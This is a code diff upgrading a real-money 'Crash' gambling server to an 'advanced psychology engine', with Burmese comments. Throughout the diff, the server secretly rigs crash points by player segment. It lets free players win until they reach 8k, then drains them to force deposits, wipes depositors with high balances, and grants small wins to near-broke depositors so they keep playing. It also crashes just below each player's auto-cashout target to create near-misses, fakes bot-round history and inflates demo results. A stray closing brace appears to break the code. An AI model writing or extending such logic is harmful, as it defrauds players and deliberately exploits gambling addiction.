@@ -1,31 +1,27 @@
 /**
  * ═══════════════════════════════════════════════════════════════════════════
- *  CRASH PRO — server.js  v7.0
+ *  CRASH PRO — server.js  v8.0
  *
- *  SMART PLAYER SEGMENTATION ENGINE:
+ *  ADVANCED PSYCHOLOGY ENGINE:
  *
- *  ┌─────────────────────────────────────────────────────────────────────┐
- *  │  SEGMENT A — "NEW FREE" (totalDeposited=0, balance<6000)           │
- *  │    → BAIT mode: ပိုက်ဆံပေး၊ ကစားချင်လာစေ                         │
- *  │    → 60% moderate win 1.20-2.50x | 15% exciting 2.5-5x            │
- *  │    → 25% small loss 1.00-1.15 (မဝင်မခြင်းမစ)                     │
- *  │                                                                     │
- *  │  SEGMENT B — "DEPOSITOR" (totalDeposited>0)                        │
- *  │    → SEPARATE round pool — မာတိုက်ရ                                │
- *  │    → Sub-mode by balance:                                           │
- *  │      • balance<6000 → DEPOSITOR_BAIT (1.30-2.20 mostly)           │
- *  │      • balance≥6000 → DRAIN (70% wipe 1.00-1.05, 25% near-miss)  │
- *  │                                                                     │
- *  │  SEGMENT C — "NEW FREE GRADUATED" (totalDeposited=0, bal≥6000)    │
- *  │    → Switch to DRAIN — ငွေသွင်းဖို့ stimulate                     │
- *  │    → 65% crash ≤1.10x, ငွေဆုံးစပြီ → deposit ဖြစ်မှ Seg B သွား  │
- *  └─────────────────────────────────────────────────────────────────────┘
+ *  FREE USER PATH (no deposit ever):
+ *   bal 1k–7.9k  → FREE_NURSE : crash ရှားသည် (8% only)  → 8k ထိတက်
+ *   bal ≥ 8k     → FREE_DRAIN : 60% wipe + near-miss      → ငွေသွင်းဖို့ stimulate
  *
- *  GAME POOL SEPARATION:
- *  • "free" pool  — Seg A + Seg C users (free balance only)
- *  • "paid" pool  — Seg B users (depositors) — completely separate round
- *  • Bot-only rounds shared (no real users)
+ *  PAID USER PATH (deposited ≥1 time):
+ *   bal < 500    → DEP_RESCUE : 65% win                   → မဆေါ့ပြေးစေ
+ *   bal 500–7.9k, bet ≤1500 → DEP_NURSE  : 45% good win   → ဖြည်းဖြည်းတည်ဆောက်
+ *   bal 500–7.9k, bet >1500 → DEP_MID    : 45% drain loss  → moderate drain
+ *   bal ≥ 8k     → DEP_DRAIN : 68% wipe                   → full take-back
  *
+ *  NEAR-MISS ENGINE:
+ *   User auto-cashout ≥2.0 set? → crash at (target-0.01) to (target-0.12)
+ *   "ဟာ... နည်းနည်းလေးပဲလိုတာ!" → dopamine loop
+ *
+ *  CHASING-LOSS MERCY:
+ *   3+ losses + bet ×1.5 bigger → mercy win 1.45–2.50x (once)
+ *
+ *  TWO POOLS: free (Seg A+C) | paid (Seg B) — completely separate rounds
  * ═══════════════════════════════════════════════════════════════════════════
  */
 
@@ -143,171 +139,248 @@ const Transaction = mongoose.model('Transaction', transactionSchema);
 const RefLog      = mongoose.model('RefLog',      refLogSchema);
 
 // ═══════════════════════════════════════════════════════════════════════════
-//  PLAYER SEGMENTATION
+//  v8.0 — ADVANCED PLAYER PSYCHOLOGY ENGINE
+//
+//  FREE USER PATH (totalDeposited = 0):
+//   balance 1k–7.9k → FREE_NURSE  : ငွေတက်လာအောင် တွန်းပေး (crash ရှားသည်)
+//   balance ≥ 8k    → FREE_DRAIN  : ငွေသွင်းရ stimulate (crash မြင့်သည်)
+//   + Near-miss mechanic always on for FREE pool
+//
+//  PAID USER PATH (totalDeposited > 0):
+//   balance 500–7.9k + bet ≤ 1500  → DEP_NURSE  : bet ငယ်ကစားနေ → ဖြည်းဖြည်းတည်ဆောက်
+//   balance 500–7.9k + bet > 1500  → DEP_MID    : ဝင်ငွေကောင်း → moderate drain
+//   balance ≥ 8k                   → DEP_DRAIN  : ငွေပြည့် → full drain
+//   balance < 500                  → DEP_RESCUE : ဆုံးတော့မည် → small win ပေး (မဆေါ့ပြေးစေ)
+//
+//  NEAR-MISS ENGINE (ψ):
+//   User auto-cashout ≥ 2.0x set? → crash at (target − 0.01) to (target − 0.12) randomly
+//   Creates "so close!" dopamine loop
+//
+//  CHASING-LOSS DETECTOR:
+//   3+ consecutive losses with growing bet → DEP_MID crash softened once ("mercy round")
 // ═══════════════════════════════════════════════════════════════════════════
-/**
- * getPlayerSegment — classify a player into one of 3 manipulation modes
- *
- * @param {number} balance        current balance
- * @param {number} totalDeposited total ever deposited
- * @returns {'FREE_BAIT'|'FREE_DRAIN'|'DEP_BAIT'|'DEP_DRAIN'}
- */
-function getPlayerSegment(balance, totalDeposited) {
-  const isDepositor = totalDeposited > 0;
 
-  if (!isDepositor) {
-    // Never deposited — free player
-    if (balance < 6000) return 'FREE_BAIT';   // still building up, let them win
-    return 'FREE_DRAIN';                        // built up enough → drain to force deposit
-  } else {
-    // Has deposited real money
-    if (balance < 6000) return 'DEP_BAIT';    // balance got low → small wins to keep them playing
-    return 'DEP_DRAIN';                         // good balance → take it
+// ── Segment classifier ────────────────────────────────────────────────────────
+/**
+ * getPlayerSegment
+ * @param {number} balance
+ * @param {number} totalDeposited
+ * @param {number} betAmount  current round bet
+ * @returns {string}
+ */
+function getPlayerSegment(balance, totalDeposited, betAmount = 0) {
+  if (totalDeposited === 0) {
+    if (balance < 8000) return 'FREE_NURSE';
+    return 'FREE_DRAIN';
   }
+  // Paid users
+  if (balance < 500)  return 'DEP_RESCUE';
+  if (balance >= 8000) return 'DEP_DRAIN';
+  // 500–7999
+  if (betAmount <= 1500) return 'DEP_NURSE';
+  return 'DEP_MID';
 }
 
-// ═══════════════════════════════════════════════════════════════════════════
-//  HOUSE CONFIG
-// ═══════════════════════════════════════════════════════════════════════════
+// ── House config ──────────────────────────────────────────────────────────────
 const HOUSE = {
-  // FREE_BAIT — new user with 1k-5.9k, want them to reach 5k-6k and feel great
-  FREE_BAIT: {
-    exciting:  { rate: 0.15, min: 2.50, max: 6.00 },   // 15% big win
-    moderate:  { rate: 0.55, min: 1.25, max: 2.50 },   // 55% small-medium win
-    loss:      {             min: 1.00, max: 1.15 },   // 30% small loss
+
+  // ── FREE_NURSE: free user building up (1k → 8k target) ───────────────────
+  // Very generous — user must feel lucky & confident
+  FREE_NURSE: {
+    epic:     { rate: 0.12, min: 3.50, max: 8.00 },  // 12% — real excitement
+    good:     { rate: 0.55, min: 1.50, max: 3.50 },  // 55% — solid win
+    small:    { rate: 0.25, min: 1.10, max: 1.49 },  // 25% — tiny win (still win)
+    loss:     {             min: 1.00, max: 1.08 },  //  8% — rare small loss
   },
-  // FREE_DRAIN — free user reached 6k+, now drain them so they deposit
+
+  // ── FREE_DRAIN: free user hit 8k → drain to force deposit ────────────────
   FREE_DRAIN: {
-    wipe:      { rate: 0.65, min: 1.00, max: 1.05 },   // 65% total wipe
-    near:      { rate: 0.25, min: 1.06, max: 1.15 },   // 25% near-miss
-    mercy:     {             min: 1.16, max: 1.40 },   // 10% small mercy win
+    wipe:     { rate: 0.60, min: 1.00, max: 1.06 },  // 60% — hard wipe
+    near:     { rate: 0.30, min: 1.07, max: 1.18 },  // 30% — near-miss pain
+    mercy:    {             min: 1.20, max: 1.55 },  // 10% — mercy to keep hope
   },
-  // DEP_BAIT — depositor but balance < 6k, keep them playing (don't lose them)
-  DEP_BAIT: {
-    exciting:  { rate: 0.10, min: 2.00, max: 5.00 },   // 10% exciting win
-    moderate:  { rate: 0.50, min: 1.30, max: 2.20 },   // 50% moderate win
-    loss:      {             min: 1.00, max: 1.18 },   // 40% loss (harder than free)
+
+  // ── DEP_RESCUE: depositor almost broke → give a win to prevent quit ───────
+  DEP_RESCUE: {
+    good:     { rate: 0.65, min: 1.40, max: 2.80 },  // 65% — relief win
+    small:    { rate: 0.25, min: 1.10, max: 1.39 },  // 25% — small win
+    loss:     {             min: 1.00, max: 1.09 },  // 10% — rare loss (keep depositing)
   },
-  // DEP_DRAIN — depositor with 6k+, take it all back
+
+  // ── DEP_NURSE: depositor, bet ≤1500, balance <8k → grow slowly ───────────
+  DEP_NURSE: {
+    good:     { rate: 0.45, min: 1.40, max: 2.50 },  // 45% — nice win
+    small:    { rate: 0.35, min: 1.15, max: 1.39 },  // 35% — small win
+    loss:     {             min: 1.00, max: 1.14 },  // 20% — loss (not too harsh)
+  },
+
+  // ── DEP_MID: depositor, bet >1500, balance <8k → moderate drain ──────────
+  DEP_MID: {
+    good:     { rate: 0.20, min: 1.50, max: 2.50 },  // 20% — occasional win
+    near:     { rate: 0.35, min: 1.20, max: 1.49 },  // 35% — near-miss zone
+    loss:     {             min: 1.00, max: 1.19 },  // 45% — drain losses
+  },
+
+  // ── DEP_DRAIN: depositor, balance ≥8k → full take-back mode ──────────────
   DEP_DRAIN: {
-    wipe:      { rate: 0.70, min: 1.00, max: 1.05 },   // 70% wipe
-    near:      { rate: 0.25, min: 1.06, max: 1.18 },   // 25% near-miss
-    mercy:     {             min: 1.19, max: 1.35 },   // 5% mercy win
+    wipe:     { rate: 0.68, min: 1.00, max: 1.05 },  // 68% — crushing wipe
+    near:     { rate: 0.24, min: 1.06, max: 1.20 },  // 24% — tantalizing near-miss
+    mercy:    {             min: 1.21, max: 1.45 },  //  8% — rare mercy win
   },
 
-  // System limits
-  HIGH_BET_THRESHOLD:     30000,    // total pool wipe
-  PRESSURE_BALANCE_LIMIT: 3000,     // house in trouble
-  PRESSURE_WIPE_RATE:     0.85,
-
-  // Balance threshold for BAIT→DRAIN switch
-  BAIT_GRADUATE:          6000,
+  // ── System ───────────────────────────────────────────────────────────────
+  HIGH_BET_THRESHOLD:      30000,
+  PRESSURE_BALANCE_LIMIT:  3000,
+  PRESSURE_WIPE_RATE:      0.85,
+  DRAIN_THRESHOLD:         8000,   // balance ≥ this → drain mode
 };
 
 let houseBalance = 500000;
 
-// In-memory user info cache (updated on every bet/cashout)
-// Stores { balance, totalDeposited } for quick segment decisions
-const userInfoCache = new Map(); // userId → { balance, totalDeposited }
+// In-memory per-user cache: { balance, totalDeposited, lastBetAmt, consecutiveLosses, lastCrashSeen }
+const userInfoCache = new Map();
 
 function r2(n) { return Math.round(n * 100) / 100; }
 const rand = () => Math.random();
 
-// ═══════════════════════════════════════════════════════════════════════════
-//  CRASH POINT ENGINE
-// ═══════════════════════════════════════════════════════════════════════════
-/**
- * calculateCrashPoint
- *
- * Called with a SET of real user IDs in the round.
- * Determines the dominant segment and picks crash accordingly.
- *
- * Priority:
- *  1. High bet pool ≥30k → wipe
- *  2. House pressure      → aggressive wipe
- *  3. No real users       → varied normal (history looks legit)
- *  4. Real users          → check dominant segment
- */
-function calculateCrashPoint(totalUserBets = 0, hasRealUser = false, realUserIds = []) {
+// ── Near-miss helper ──────────────────────────────────────────────────────────
+// If a user has an auto-cashout target ≥ 2.0x set, crash just below it
+// autoCashoutTargets: Map userId → target multiplier (set by client)
+const autoCashoutTargets = new Map();
 
-  // 1. High bet wipe
+function nearMissCrash(realUserIds) {
+  // Find the highest auto-cashout target among real users in this round
+  let highestTarget = 0;
+  for (const uid of realUserIds) {
+    const t = autoCashoutTargets.get(uid) || 0;
+    if (t > highestTarget) highestTarget = t;
+  }
+  if (highestTarget >= 2.0) {
+    // Crash between (target - 0.12) and (target - 0.01)
+    const miss = 0.01 + rand() * 0.11;
+    const cp   = r2(Math.max(1.10, highestTarget - miss));
+    console.log(`🎯 NEAR-MISS: target=${highestTarget} → crash=${cp}`);
+    return cp;
+  }
+  return null;
+}
+
+// ── Chasing-loss mercy ────────────────────────────────────────────────────────
+// Track consecutive losses per user; mercy round if ≥3 losses with rising bets
+function shouldGrantMercy(uid, currentBet) {
+  const info = userInfoCache.get(uid);
+  if (!info) return false;
+  if (info.consecutiveLosses >= 3 && currentBet >= info.lastBetAmt * 1.5) {
+    console.log(`💝 MERCY round for ${uid} (${info.consecutiveLosses} consec losses)`);
+    return true;
+  }
+  return false;
+}
+
+// ── Main crash point engine ────────────────────────────────────────────────────
+function calculateCrashPoint(totalUserBets = 0, hasRealUser = false, realUserIds = [], realUserBets = {}) {
+
+  // 1. High bet pool → wipe
   if (totalUserBets >= HOUSE.HIGH_BET_THRESHOLD) {
-    console.log(`💣 HIGH BET WIPE 1.00x (pool=${totalUserBets})`);
+    console.log(`💣 HIGH BET WIPE (pool=${totalUserBets})`);
     return 1.00;
   }
 
   // 2. House pressure
   if (houseBalance < HOUSE.PRESSURE_BALANCE_LIMIT) {
-    if (rand() < HOUSE.PRESSURE_WIPE_RATE) {
-      console.log(`🔴 PRESSURE WIPE (house=${houseBalance})`);
-      return 1.00;
-    }
-    return r2(1.01 + rand() * 0.10);
+    if (rand() < HOUSE.PRESSURE_WIPE_RATE) return 1.00;
+    return r2(1.01 + rand() * 0.09);
   }
 
-  // 3. No real user — bot-only variety round
+  // 3. Bot-only round — diverse history so it looks real
   if (!hasRealUser) {
     const roll = rand();
-    if (roll < 0.20) return 1.00;
-    if (roll < 0.45) return r2(1.10 + rand() * 0.60);
-    if (roll < 0.70) return r2(1.70 + rand() * 1.30);
-    if (roll < 0.88) return r2(3.00 + rand() * 4.00);
-    return r2(7.00 + rand() * 8.00);
+    if (roll < 0.18) return 1.00;
+    if (roll < 0.42) return r2(1.10 + rand() * 0.70);
+    if (roll < 0.68) return r2(1.80 + rand() * 1.50);
+    if (roll < 0.87) return r2(3.30 + rand() * 4.70);
+    return r2(8.00 + rand() * 7.00);
   }
 
-  // 4. Real users — find dominant segment
-  // Use the WORST (for user) segment among all active users
-  // i.e., if ANY user is DEP_DRAIN → whole round is DEP_DRAIN
-  let dominantSegment = 'FREE_BAIT';
-  const segmentPriority = { 'FREE_BAIT': 0, 'DEP_BAIT': 1, 'FREE_DRAIN': 2, 'DEP_DRAIN': 3 };
+  // 4. Real users present — determine dominant segment
+  const segPriority = { FREE_NURSE:0, DEP_RESCUE:1, DEP_NURSE:2, DEP_MID:3, FREE_DRAIN:4, DEP_DRAIN:5 };
+  let dominant = 'FREE_NURSE';
+  let dominantUid = null;
+  let dominantBet = 0;
 
   for (const uid of realUserIds) {
-    const info = userInfoCache.get(uid);
-    if (!info) continue;
-    const seg = getPlayerSegment(info.balance, info.totalDeposited);
-    if (segmentPriority[seg] > segmentPriority[dominantSegment]) {
-      dominantSegment = seg;
+    const info   = userInfoCache.get(uid) || {};
+    const betAmt = realUserBets[uid] || info.lastBetAmt || 0;
+    const seg    = getPlayerSegment(info.balance || 0, info.totalDeposited || 0, betAmt);
+
+    // Check mercy override first
+    if (shouldGrantMercy(uid, betAmt)) {
+      // Override to rescue mode temporarily
+      console.log(`🎀 MERCY OVERRIDE for ${uid}`);
+      return r2(1.45 + rand() * 1.05); // 1.45–2.50 mercy win
+    }
+
+    if (segPriority[seg] > segPriority[dominant]) {
+      dominant    = seg;
+      dominantUid = uid;
+      dominantBet = betAmt;
     }
   }
 
-  console.log(`🎯 Segment=${dominantSegment} | users=${realUserIds.length} | pool=${totalUserBets}`);
+  // 5. Near-miss check for drain segments
+  if (dominant === 'DEP_DRAIN' || dominant === 'FREE_DRAIN' || dominant === 'DEP_MID') {
+    const nm = nearMissCrash(realUserIds);
+    if (nm) return nm;
+  }
 
-  return applyCrashMode(dominantSegment);
+  console.log(`🎯 [${dominant}] users=${realUserIds.length} pool=${totalUserBets}`);
+  return applyCrashMode(dominant);
 }
 
 function applyCrashMode(segment) {
-  const cfg = HOUSE[segment];
+  const cfg  = HOUSE[segment];
   const roll = rand();
 
-  if (segment === 'FREE_BAIT') {
-    if (roll < cfg.exciting.rate)
-      return r2(cfg.exciting.min + rand() * (cfg.exciting.max - cfg.exciting.min));
-    if (roll < cfg.exciting.rate + cfg.moderate.rate)
-      return r2(cfg.moderate.min + rand() * (cfg.moderate.max - cfg.moderate.min));
-    return r2(cfg.loss.min + rand() * (cfg.loss.max - cfg.loss.min));
+  switch (segment) {
+    case 'FREE_NURSE': {
+      if (roll < cfg.epic.rate)                        return r2(cfg.epic.min  + rand()*(cfg.epic.max  - cfg.epic.min));
+      if (roll < cfg.epic.rate + cfg.good.rate)        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
+      if (roll < cfg.epic.rate + cfg.good.rate + cfg.small.rate) return r2(cfg.small.min + rand()*(cfg.small.max - cfg.small.min));
+      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
+    }
+    case 'FREE_DRAIN':
+    case 'DEP_DRAIN': {
+      if (roll < cfg.wipe.rate)                        return r2(cfg.wipe.min  + rand()*(cfg.wipe.max  - cfg.wipe.min));
+      if (roll < cfg.wipe.rate + cfg.near.rate)        return r2(cfg.near.min  + rand()*(cfg.near.max  - cfg.near.min));
+      return r2(cfg.mercy.min + rand()*(cfg.mercy.max - cfg.mercy.min));
+    }
+    case 'DEP_RESCUE': {
+      if (roll < cfg.good.rate)                        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
+      if (roll < cfg.good.rate + cfg.small.rate)       return r2(cfg.small.min + rand()*(cfg.small.max - cfg.small.min));
+      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
+    }
+    case 'DEP_NURSE': {
+      if (roll < cfg.good.rate)                        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
+      if (roll < cfg.good.rate + cfg.small.rate)       return r2(cfg.small.min + rand()*(cfg.small.max - cfg.small.min));
+      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
+    }
+    case 'DEP_MID': {
+      if (roll < cfg.good.rate)                        return r2(cfg.good.min  + rand()*(cfg.good.max  - cfg.good.min));
+      if (roll < cfg.good.rate + cfg.near.rate)        return r2(cfg.near.min  + rand()*(cfg.near.max  - cfg.near.min));
+      return r2(cfg.loss.min + rand()*(cfg.loss.max - cfg.loss.min));
+    }
+    default:
+      return r2(1.20 + rand() * 0.80);
   }
-
-  if (segment === 'DEP_BAIT') {
-    if (roll < cfg.exciting.rate)
-      return r2(cfg.exciting.min + rand() * (cfg.exciting.max - cfg.exciting.min));
-    if (roll < cfg.exciting.rate + cfg.moderate.rate)
-      return r2(cfg.moderate.min + rand() * (cfg.moderate.max - cfg.moderate.min));
-    return r2(cfg.loss.min + rand() * (cfg.loss.max - cfg.loss.min));
-  }
-
-  if (segment === 'FREE_DRAIN' || segment === 'DEP_DRAIN') {
-    if (roll < cfg.wipe.rate)
-      return r2(cfg.wipe.min + rand() * (cfg.wipe.max - cfg.wipe.min));
-    if (roll < cfg.wipe.rate + cfg.near.rate)
-      return r2(cfg.near.min + rand() * (cfg.near.max - cfg.near.min));
-    return r2(cfg.mercy.min + rand() * (cfg.mercy.max - cfg.mercy.min));
-  }
-
-  return r2(1.10 + rand() * 0.90);
 }
 
 function generateDemoCrashPoint() {
-  return r2(3.0 + rand() * 7.0);
+  // Demo shows exciting numbers to entice betting
+  const roll = rand();
+  if (roll < 0.30) return r2(2.50 + rand() * 3.00);   // 2.5x–5.5x
+  if (roll < 0.65) return r2(5.50 + rand() * 4.50);   // 5.5x–10x
+  return r2(10.0  + rand() * 5.00);                    // 10x–15x
+}
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
@@ -378,6 +451,7 @@ function createFreshPool(poolName) {
     totalUserBets:     0,
     hasRealUser:       false,
     realUserIds:       [],
+    realUserBets:      {},   // userId → betAmount for this round
     history:           [],
   };
 }
@@ -481,7 +555,7 @@ bot.command('balance', async ctx => {
   try {
     const u = await User.findOne({ telegramId: String(ctx.from.id) });
     if (!u) return ctx.reply('❌ /start ကိုနှိပ်ပါ');
-    const seg = getPlayerSegment(u.balance, u.totalDeposited);
+    const seg = getPlayerSegment(u.balance, u.totalDeposited, 0);
     await ctx.replyWithHTML(`💰 Balance: <b>${u.balance.toLocaleString()} MMK</b>\n🎮 Mode: ${seg}`);
   } catch {}
 });
@@ -539,7 +613,7 @@ async function runPoolLoop(G) {
 async function runCountdown(G) {
   roundCounter++;
   G.bets = new Map(); G.totalBetsAmount=0; G.totalUserBets=0;
-  G.hasRealUser=false; G.realUserIds=[]; G.currentMultiplier=1.0;
+  G.hasRealUser=false; G.realUserIds=[]; G.realUserBets={}; G.currentMultiplier=1.0;
   G.phase='countdown'; G.gameId=generateGameId(); G.crashPoint=0;
 
   // Emit to the correct pool room
@@ -555,7 +629,7 @@ async function runCountdown(G) {
 
   await sleep(COUNTDOWN_SECONDS * 1000);
 
-  G.crashPoint = calculateCrashPoint(G.totalUserBets, G.hasRealUser, G.realUserIds);
+  G.crashPoint = calculateCrashPoint(G.totalUserBets, G.hasRealUser, G.realUserIds, G.realUserBets);
   console.log(`📊 [${G.poolName}] Round ${roundCounter} crash=${G.crashPoint}x userBets=${G.totalUserBets} house=${houseBalance}`);
 }
 
@@ -641,9 +715,15 @@ async function placeBet(userId, username, amount) {
     G.totalBetsAmount += amount; G.totalUserBets += amount;
     if (!G.hasRealUser) G.hasRealUser = true;
     if (!G.realUserIds.includes(userId)) G.realUserIds.push(userId);
+    G.realUserBets[userId] = amount; // ★ track per-user bet for segment engine
 
     // Update balance cache with full user info for segment decisions
-    userInfoCache.set(userId, { balance: user.balance, totalDeposited: user.totalDeposited });
+    userInfoCache.set(userId, {
+      balance:          user.balance,
+      totalDeposited:   user.totalDeposited,
+      lastBetAmt:       amount,
+      consecutiveLosses: (userInfoCache.get(userId)?.consecutiveLosses || 0),
+    });
 
     io.emit('balanceUpdate', { userId, balance:user.balance });
     io.to(G.poolName).emit('activeBets', { bets:activeBetsSnapshot(G), pool:G.poolName });
@@ -684,9 +764,12 @@ async function cashOut(userId, clientMultiplier, clientGameId) {
       // Update segment pool assignment if they just crossed threshold
       await updateUserPool(userId, user.balance, user.totalDeposited);
 
+      // ★ Reset consecutive loss streak on win
+      const prev = userInfoCache.get(userId) || {};
+      userInfoCache.set(userId, { ...prev, balance:user.balance, totalDeposited:user.totalDeposited, consecutiveLosses:0 });
+
       Bet.create({ userId, username:bet.username, amount:bet.amount, gameId:G.gameId, cashoutMultiplier:multiplier, profit, status:'won', cashedAt:new Date(), pool:G.poolName }).catch(()=>{});
       io.emit('balanceUpdate', { userId, balance:user.balance });
-      userInfoCache.set(userId, { balance:user.balance, totalDeposited:user.totalDeposited });
     }
     io.to(G.poolName).emit('betResult', { success:true, type:'cashout', userId, gameId:G.gameId, multiplier, profit, betAmount:bet.amount, totalReturn });
     io.to(G.poolName).emit('newHistory', { username:bet.username, start:1.0, stop:multiplier, profit, isBot:false, status:'won' });
@@ -758,6 +841,15 @@ function processBotCashouts(G) {
 
 async function processBetLoss(userId, bet, G) {
   if (bet.isBot) { const b=BOT_POOL.get(userId); if(b&&b.balance<1000) b.balance+=3000; }
+  else {
+    // ★ Increment consecutive loss counter
+    const prev = userInfoCache.get(userId) || {};
+    userInfoCache.set(userId, {
+      ...prev,
+      consecutiveLosses: (prev.consecutiveLosses || 0) + 1,
+      lastBetAmt: bet.amount,
+    });
+  }
   io.to(G.poolName).emit('newHistory', { username:bet.username, start:1.0, stop:G.crashPoint, profit:-bet.amount, isBot:bet.isBot, status:'lost' });
 }
 
@@ -806,6 +898,12 @@ io.on('connection', async (socket) => {
     cb(await cashOut(String(data.userId), data.multiplier, data.gameId));
   });
 
+  socket.on('setAutoCashout', d => {
+    if (d?.userId && d?.target && d.target >= 1.10) {
+      autoCashoutTargets.set(String(d.userId), parseFloat(d.target));
+    }
+  });
+
   socket.on('authenticate', async d => {
     if (!d?.userId) return;
     socket.userId = String(d.userId);
@@ -845,7 +943,7 @@ app.post('/api/auth', async (req, res) => {
     }
     // Set pool assignment on auth
     await updateUserPool(tid, user.balance, user.totalDeposited);
-    const seg = getPlayerSegment(user.balance, user.totalDeposited);
+    const seg = getPlayerSegment(user.balance, user.totalDeposited, 0);
     const pool = user.totalDeposited > 0 ? 'paid' : 'free';
     res.json({ success:true, user:{ id:user.telegramId, username:user.username, balance:user.balance, totalDeposited:user.totalDeposited, totalWithdrawn:user.totalWithdrawn, pool, segment:seg } });
   } catch { res.status(500).json({ success:false, message:'Server error' }); }
@@ -903,7 +1001,7 @@ app.get('/api/admin/users', adminGuard, async (req, res) => {
     // Annotate each user with live segment
     const annotated = users.map(u => ({
       ...u,
-      segment: getPlayerSegment(u.balance, u.totalDeposited),
+      segment: getPlayerSegment(u.balance, u.totalDeposited, 0),
       pool: u.totalDeposited > 0 ? 'paid' : 'free',
     }));
     res.json({ success:true, users:annotated, total:annotated.length });
